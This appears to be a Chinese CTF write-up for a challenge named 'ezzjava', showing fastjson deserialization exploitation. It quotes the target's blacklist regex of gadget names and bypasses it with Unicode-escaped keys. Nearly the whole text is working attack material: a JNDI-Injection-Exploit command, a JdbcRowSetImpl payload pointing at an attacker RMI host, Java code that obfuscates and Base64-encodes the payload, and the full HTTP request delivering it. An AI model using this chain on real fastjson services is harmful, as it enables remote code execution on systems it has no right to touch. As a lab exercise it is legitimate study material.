## ezzjava
fastjson反序列化。 

代码里面有个黑名单， Unicode绕过
```java
Pattern p = Pattern.compile("JdbcRowSetImpl|type|dataSourceName|autoCommit|TemplatesImpl|bytecodes|BasicDataSource", 8);
// 看Pattern源码里面 java.util.regex.Pattern#MULTILINE: `public static final int MULTILINE = 0x08;`
```

```sh
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "C:\Windows\System32\calc.exe" -A "192.168.50.161"
```

用这个payload打，修改一下
```
{
 "1": {
 "@type": "java.lang.Class", 
 "val": "com.sun.rowset.JdbcRowSetImpl"
 }, 
 "2": {
 "@type": "com.sun.rowset.JdbcRowSetImpl", 
 "dataSourceName": "rmi://192.168.1.13:1099/v4v9uh", 
 "autoCommit": true
 }
}
```

```java
import com.alibaba.fastjson.JSON;

import java.util.Base64;

public class Main {
    public static void main(String[] args) {
        System.out.println("Hello world!");
        String payload = "{\n" +
                " \"1\": {\n" +
                " \"@\\u0074\\u0079\\u0070\\u0065\": \"java.lang.Class\", \n" +
                " \"val\": \"com.sun.rowset.\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"\n" +
                " }, \n" +
                " \"2\": {\n" +
                " \"@\\u0074\\u0079\\u0070\\u0065\": \"com.sun.rowset.\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\", \n" +
                " \"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\": \"rmi://192.168.50.161:1099/ytecfe\", \n" +
                " \"\\u0061\\u0075\\u0074\\u006f\\u0043\\u006f\\u006d\\u006d\\u0069\\u0074\": true\n }\n" +
                "}\n";
        System.out.println(Base64.getEncoder().encodeToString(payload.getBytes()));
        JSON.parse(payload);
    }
}
```

```
POST /login HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 697
sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

data=ewogIjEiOiB7CiAiQFx1MDA3NFx1MDA3OVx1MDA3MFx1MDA2NSI6ICJqYXZhLmxhbmcuQ2xhc3MiLCAKICJ2YWwiOiAiY29tLnN1bi5yb3dzZXQuXHUwMDRhXHUwMDY0XHUwMDYyXHUwMDYzXHUwMDUyXHUwMDZmXHUwMDc3XHUwMDUzXHUwMDY1XHUwMDc0XHUwMDQ5XHUwMDZkXHUwMDcwXHUwMDZjIgogfSwgCiAiMiI6IHsKICJAXHUwMDc0XHUwMDc5XHUwMDcwXHUwMDY1IjogImNvbS5zdW4ucm93c2V0Llx1MDA0YVx1MDA2NFx1MDA2Mlx1MDA2M1x1MDA1Mlx1MDA2Zlx1MDA3N1x1MDA1M1x1MDA2NVx1MDA3NFx1MDA0OVx1MDA2ZFx1MDA3MFx1MDA2YyIsIAogIlx1MDA2NFx1MDA2MVx1MDA3NFx1MDA2MVx1MDA1M1x1MDA2Zlx1MDA3NVx1MDA3Mlx1MDA2M1x1MDA2NVx1MDA0ZVx1MDA2MVx1MDA2ZFx1MDA2NSI6ICJybWk6Ly8xOTIuMTY4LjUwLjE2MToxMDk5L3l0ZWNmZSIsIAogIlx1MDA2MVx1MDA3NVx1MDA3NFx1MDA2Zlx1MDA0M1x1MDA2Zlx1MDA2ZFx1MDA2ZFx1MDA2OVx1MDA3NCI6IHRydWUKIH0KfQo=
```

![](https://img2023.cnblogs.com/blog/2031662/202306/2031662-20230607010454962-1528653746.png)
